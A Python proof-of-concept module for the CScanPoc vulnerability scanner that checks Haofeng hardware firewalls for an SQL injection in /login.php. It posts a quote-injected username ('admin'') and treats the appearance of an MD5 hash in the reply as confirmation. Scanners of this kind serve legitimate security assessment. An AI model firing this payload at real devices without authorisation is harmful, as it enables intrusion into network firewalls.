# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Chinaiwb_0002'  # 平台漏洞编号，留空
    name = '皓峰防火墙系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-18'  # 漏洞公布时间
    desc = '''
        皓峰硬件防火墙系统 /login.php SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '皓峰防火墙'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '73b5a931-3fb2-4a94-affd-e5f4ad074f5e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref:http://www.wooyun.org/bugs/wooyun-2010-0114593
            hh = hackhttp.hackhttp()
            arg = self.target
            poc = arg + '/login.php'
            postdata = "action=login&username=admin'&password=admin&submit=%E7%99%BB %E5%BD%95"
            code, head, res, errcode, _ = hh.http(poc, post=postdata)

            if code == 200 and '21232f297a57a5a743894a0e4a801fc3' in res:
                #security_hole(poc+", can be sqli ,ref:http://www.wooyun.org/bugs/wooyun-2010-0114593")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
